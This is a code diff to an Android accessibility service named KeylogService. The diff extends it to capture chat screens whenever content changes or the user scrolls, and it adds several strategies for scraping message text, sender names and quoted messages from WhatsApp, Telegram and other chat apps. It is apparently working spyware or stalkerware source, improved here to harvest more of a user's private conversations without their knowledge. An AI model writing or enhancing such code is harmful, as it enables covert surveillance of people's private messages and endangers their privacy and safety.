@@ -161,6 +161,18 @@ public class KeylogService extends AccessibilityService {
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     handleViewFocused(event);
                     break;
+                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
+                    // New content in chat = new messages
+                    if (isChatApp(currentApp)) {
+                        captureChatScreen(currentApp);
+                    }
+                    break;
+                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
+                    // User scrolled in chat = capture more
+                    if (isChatApp(currentApp)) {
+                        captureChatScreen(currentApp);
+                    }
+                    break;
             }
         } catch (Exception e) {
             Log.e(TAG, "Event handler error", e);
@@ -332,23 +344,112 @@ public class KeylogService extends AccessibilityService {
     }
 
     private void traverseForMessages(AccessibilityNodeInfo node, JSONArray msgs, String pkg, int depth) {
-        if (node == null || depth > 8) return; // Limit depth
+        if (node == null || depth > 20) return; // Increased depth from 8 to 20
         
         try {
             CharSequence text = node.getText();
+            CharSequence contentDesc = node.getContentDescription();
             String className = node.getClassName() != null ? node.getClassName().toString() : "";
+            String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
 
-            // Capture significant text from TextViews
+            // === Strategy 1: Direct TextView content ===
             if (className.contains("TextView") && text != null && text.length() > 2) {
-                // Skip known noise
                 String t = text.toString().trim();
+                String cd = contentDesc != null ? contentDesc.toString().trim() : "";
+                
+                // Skip noise
                 if (t.equals("Type a message") || t.contains("Typing…") || t.isEmpty()) return;
+                
+                // Skip if it's the message input field
+                if (viewId.contains("input") || viewId.contains("edit_text")) return;
+                
+                // Skip time stamps like "10:30 AM"
+                if (t.matches("\\d{1,2}:\\d{2}\\s*(AM|PM)?")) return;
+                
+                // Skip date separators like "Today", "Yesterday"
+                if (t.equals("Today") || t.equals("Yesterday")) return;
+
+                // Check if we already have this text (dedup)
+                boolean isDuplicate = false;
+                for (int j = 0; j < msgs.length(); j++) {
+                    JSONObject existing = msgs.getJSONObject(j);
+                    if (existing.optString("text", "").equals(t)) {
+                        isDuplicate = true;
+                        break;
+                    }
+                }
+                if (isDuplicate) return;
 
                 JSONObject msg = new JSONObject();
                 msg.put("text", t);
-                msg.put("view_id", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
-                msg.put("content_desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
+                msg.put("view_id", viewId);
+                msg.put("type", "textview");
+                if (!cd.isEmpty()) msg.put("content_desc", cd);
                 msgs.put(msg);
+                return; // Don't recurse into children of a matched text view
+            }
+
+            // === Strategy 2: Content descriptions ===
+            // WhatsApp uses content_description for some message elements
+            if (text == null && contentDesc != null && contentDesc.length() > 3) {
+                String cd = contentDesc.toString().trim();
+                if (!cd.contains("Double tap to") && !cd.contains("Tab to") && !cd.contains("button")) {
+                    boolean isDuplicate = false;
+                    for (int j = 0; j < msgs.length(); j++) {
+                        JSONObject existing = msgs.getJSONObject(j);
+                        if (existing.optString("text", "").equals(cd)) {
+                            isDuplicate = true;
+                            break;
+                        }
+                    }
+                    if (!isDuplicate) {
+                        JSONObject msg = new JSONObject();
+                        msg.put("text", cd);
+                        msg.put("view_id", viewId);
+                        msg.put("type", "content_desc");
+                        msgs.put(msg);
+                    }
+                }
+            }
+
+            // === Strategy 3: WhatsApp-specific view IDs ===
+            if (pkg.contains("whatsapp")) {
+                if (viewId.contains("message_text") || viewId.contains("conversation_contact_name") ||
+                    viewId.contains("sender_name") || viewId.contains("quoted_message")) {
+                    // Already captured via Strategy 1 or 2, but ensure we get it
+                    if (text != null && text.length() > 2) {
+                        String t = text.toString().trim();
+                        boolean isDuplicate = false;
+                        for (int j = 0; j < msgs.length(); j++) {
+                            if (msgs.getJSONObject(j).optString("text", "").equals(t)) {
+                                isDuplicate = true; break;
+                            }
+                        }
+                        if (!isDuplicate) {
+                            JSONObject msg = new JSONObject();
+                            msg.put("text", t);
+                            msg.put("view_id", viewId);
+                            msg.put("type", "whatsapp_specific");
+                            msgs.put(msg);
+                        }
+                    }
+                    // Don't return — still want to capture children
+                }
+            }
+
+            // === Strategy 4: Telegram-specific content ===
+            if (pkg.contains("telegram")) {
+                // Telegram chat messages are in specific layouts
+                if (viewId.contains("chat_message_text") || viewId.contains("message_text")) {
+                    if (text != null && text.length() > 2) {
+                        String t = text.toString().trim();
+                        JSONObject msg = new JSONObject();
+                        msg.put("text", t);
+                        msg.put("view_id", viewId);
+                        msg.put("type", "telegram_message");
+                        msgs.put(msg);
+                    }
+                }
             }
 
             // Recurse children
